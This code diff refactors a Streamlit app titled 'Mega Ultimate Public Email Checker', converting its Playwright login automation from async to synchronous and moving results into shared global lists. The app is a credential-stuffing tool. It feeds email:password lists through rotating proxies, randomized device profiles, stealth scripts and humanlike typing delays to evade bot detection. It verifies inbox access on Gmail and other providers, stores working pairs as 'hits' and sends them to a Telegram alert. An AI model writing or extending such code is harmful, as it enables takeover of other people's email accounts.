@@ -12,8 +12,12 @@ import hashlib
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs, unquote
 
-# --- GLOBAL THREAD GUARD ---
+# --- GLOBAL THREAD GUARD & THREAD-SAFE STORAGE ---
 worker_running = False
+global_logs = []
+global_successful_accounts = []
+global_live_sessions = {}
+global_filtered_disposable = []
 
 @st.cache_resource(show_spinner="Initializing Playwright browser...")
 def install_playwright():
@@ -142,11 +146,19 @@ if "proxy_stats" not in st.session_state:
 if "help_states" not in st.session_state:
     st.session_state.help_states = {}
 
+def sync_globals_to_session():
+    with results_lock:
+        st.session_state.engine_logs = list(global_logs)
+        st.session_state.SUCCESSFUL_ACCOUNTS = list(global_successful_accounts)
+        st.session_state.LIVE_SESSIONS = dict(global_live_sessions)
+        st.session_state.filtered_disposable = list(global_filtered_disposable)
+
 def log_action(message):
     timestamp = datetime.now().strftime("%H:%M:%S")
     log_entry = f"[{timestamp}] 🖱️ ACTION: {message}"
     with results_lock:
-        st.session_state.engine_logs.append(log_entry)
+        global_logs.append(log_entry)
+    sync_globals_to_session()
 
 def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
     if key_name not in st.session_state.help_states:
@@ -473,7 +485,7 @@ if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_contai
             st.sidebar.error(f"Proxy fetch error: {str(e)}")
 
 # ==========================================
-# MULTI-PROVIDER AUTOMATION ENGINE
+# MULTI-PROVIDER SYNCHRONOUS AUTOMATION ENGINE
 # ==========================================
 INBOX_MARKERS = (
     "new mail", "inbox", "focused", "deleted items", "junk email",
@@ -483,23 +495,23 @@ INBOX_MARKERS = (
 def sticky_idx(email, n):
     return int(hashlib.md5(email.lower().encode()).hexdigest(), 16) % n if n else 0
 
-async def human_fill(page, loc, text, typing_ms=80):
+def human_fill(page, loc, text, typing_ms=80):
     try:
-        await loc.click(timeout=2000, force=True)
+        loc.click(timeout=2000, force=True)
     except Exception:
         pass
     try:
-        await loc.fill("")
+        loc.fill("")
     except Exception:
         pass
     try:
         for ch in text:
-            await loc.type(ch, delay=random.randint(int(typing_ms * 0.5), int(typing_ms * 1.5)))
+            loc.type(ch, delay=random.randint(int(typing_ms * 0.5), int(typing_ms * 1.5)))
         return
     except Exception:
-        await loc.fill(text)
+        loc.fill(text)
 
-async def click_text(page, labels):
+def click_text(page, labels):
     for t in labels:
         for sel in (
             f"button:has-text('{t}')",
@@ -510,8 +522,8 @@ async def click_text(page, labels):
         ):
             try:
                 loc = page.locator(sel).first
-                if await loc.count() and await loc.is_visible(timeout=400):
-                    await loc.click(timeout=4000)
+                if loc.count() and loc.is_visible(timeout=400):
+                    loc.click(timeout=4000)
                     return t
             except Exception:
                 continue
@@ -529,20 +541,20 @@ def is_real_inbox(sc):
         return True
     return False
 
-async def read_screen(page):
+def read_screen(page):
     url = page.url or ""
     title, text, buttons = "", "", []
     try:
-        title = await page.title()
+        title = page.title()
     except Exception:
         pass
     try:
-        text = (await page.locator("body").inner_text(timeout=3500))[:1200]
+        text = (page.locator("body").inner_text(timeout=3500))[:1200]
     except Exception:
         pass
     try:
-        for el in (await page.locator("button, a, [role='button'], input[type='submit']").all())[:25]:
-            t = ((await el.inner_text()) or (await el.get_attribute("value") or "")).strip()
+        for el in (page.locator("button, a, [role='button'], input[type='submit']").all())[:25]:
+            t = ((el.inner_text()) or (el.get_attribute("value") or "")).strip()
             if t and len(t) < 90:
                 buttons.append(t)
     except Exception:
@@ -550,7 +562,7 @@ async def read_screen(page):
     low = f"{url} {title} {text}".lower()
     return {"url": url, "title": title, "text": text, "buttons": buttons, "low": low}
 
-async def execute_login_flow(page, email, password, provider, config):
+def execute_login_flow(page, email, password, provider, config):
     domain = email.split("@")[-1].lower()
     
     if "gmail" in domain or "google" in provider.lower():
@@ -568,7 +580,7 @@ async def execute_login_flow(page, email, password, provider, config):
 
     t0 = time.time()
     try:
-        await page.goto(login_url, wait_until="domcontentloaded", timeout=30000)
+        page.goto(login_url, wait_until="domcontentloaded", timeout=30000)
     except Exception as e:
         return "error", f"nav fail: {e}"
 
@@ -577,7 +589,7 @@ async def execute_login_flow(page, email, password, provider, config):
         if time.time() - t0 > config.get("DEADLINE", 45):
             return "error", "account timeout"
 
-        sc = await read_screen(page)
+        sc = read_screen(page)
         if is_real_inbox(sc):
             return "success", "Inbox verified successfully."
 
@@ -587,23 +599,23 @@ async def execute_login_flow(page, email, password, provider, config):
 
         if not email_done:
             em_loc = page.locator(email_sel).first
-            if await em_loc.count() and await em_loc.is_visible():
-                await human_fill(page, em_loc, email, config.get("TYPING_MS", 80))
-                await click_text(page, ["Next", "Sign in", "Continue"])
+            if em_loc.count() and em_loc.is_visible():
+                human_fill(page, em_loc, email, config.get("TYPING_MS", 80))
+                click_text(page, ["Next", "Sign in", "Continue"])
                 email_done = True
-                await page.wait_for_timeout(2500)
+                page.wait_for_timeout(2500)
                 continue
 
         if email_done and not pass_done:
             pw_loc = page.locator(pass_sel).first
-            if await pw_loc.count() and await pw_loc.is_visible():
-                await human_fill(page, pw_loc, password, config.get("TYPING_MS", 80))
-                await click_text(page, ["Sign in", "Next", "Verify", "Continue"])
+            if pw_loc.count() and pw_loc.is_visible():
+                human_fill(page, pw_loc, password, config.get("TYPING_MS", 80))
+                click_text(page, ["Sign in", "Next", "Verify", "Continue"])
                 pass_done = True
-                await page.wait_for_timeout(3000)
+                page.wait_for_timeout(3000)
                 continue
 
-        await page.wait_for_timeout(1000)
+        page.wait_for_timeout(1000)
 
     return "error", "max steps reached"
 
@@ -612,11 +624,11 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
     worker_running = True
 
     try:
-        import asyncio
         from playwright.sync_api import sync_playwright
 
         with results_lock:
-            st.session_state.engine_logs.append(f"Engine launched for {len(accounts_list)} accounts with {max_workers} workers.")
+            global_logs.append(f"Engine launched for {len(accounts_list)} accounts with {max_workers} workers.")
+        sync_globals_to_session()
 
         def worker_thread_task():
             global worker_running
@@ -636,7 +648,7 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
 
                     if config.get("FILTER_DISPOSABLE", True) and is_disposable_email(email):
                         with results_lock:
-                            st.session_state.filtered_disposable.append(email)
+                            global_filtered_disposable.append(email)
                         continue
 
                     device = random.choice(DEVICE_PROFILES)
@@ -662,45 +674,48 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
                             context.add_init_script(STEALTH_JS)
                         page = context.new_page()
 
-                        loop = asyncio.new_event_loop()
-                        asyncio.set_event_loop(loop)
-                        status, detail = loop.run_until_complete(execute_login_flow(page, email, password, provider_override, config))
+                        status, detail = execute_login_flow(page, email, password, provider_override, config)
 
                         timestamp = datetime.now().strftime("%H:%M:%S")
                         with results_lock:
                             if status == "success":
                                 msg = f"[{timestamp}] ✅ SUCCESS: {email} verified! [{detail}]"
-                                st.session_state.engine_logs.append(msg)
-                                st.session_state.LIVE_SESSIONS[email] = {"status": "Active", "time": timestamp, "proxy": selected_proxy or "Direct", "snippet": detail}
+                                global_logs.append(msg)
+                                global_live_sessions[email] = {"status": "Active", "time": timestamp, "proxy": selected_proxy or "Direct", "snippet": detail}
                                 hit_entry = f"{email}:{password}"
-                                if hit_entry not in st.session_state.SUCCESSFUL_ACCOUNTS:
-                                    st.session_state.SUCCESSFUL_ACCOUNTS.append(hit_entry)
+                                if hit_entry not in global_successful_accounts:
+                                    global_successful_accounts.append(hit_entry)
                                 send_telegram_alert(f"⚡ HIT SUCCESS: {email} | Proxy: {selected_proxy}")
                             else:
-                                st.session_state.engine_logs.append(f"[{timestamp}] ❌ {status.upper()}: {email} ({detail})")
+                                global_logs.append(f"[{timestamp}] ❌ {status.upper()}: {email} ({detail})")
 
                         context.close()
                     except Exception as e:
                         with results_lock:
-                            st.session_state.engine_logs.append(f"⚠️ Worker Exception for {email}: {str(e)}")
+                            global_logs.append(f"⚠️ Worker Exception for {email}: {str(e)}")
 
+                    sync_globals_to_session()
                     time.sleep(1)
 
                 browser.close()
                 worker_running = False
+                sync_globals_to_session()
 
         t = threading.Thread(target=worker_thread_task, daemon=True)
         t.start()
     except Exception as e:
         worker_running = False
         with results_lock:
-            st.session_state.engine_logs.append(f"🚨 Critical Engine Error: {str(e)}")
+            global_logs.append(f"🚨 Critical Engine Error: {str(e)}")
+        sync_globals_to_session()
 
 # ==========================================
 # MAIN INTERFACE TABS
 # ==========================================
 st.title("⚡ Mega Ultimate Public Email Checker")
 st.markdown("Custom URL Slug: `positive-public-email-checker.streamlit.app` — Modular Multi-Provider Engine.")
+
+sync_globals_to_session()
 
 tab_engine, tab_terminal = st.tabs([
     "🚀 Engine Runner", 
@@ -752,7 +767,9 @@ with tab_engine:
     with c3:
         if st.button("🧹 Clear Logs & Cache", use_container_width=True):
             log_action("Clicked 'Clear Logs & Cache'")
-            st.session_state.engine_logs = []
+            with results_lock:
+                global_logs.clear()
+            sync_globals_to_session()
             st.success("Logs successfully cleared!")
             st.rerun()
 
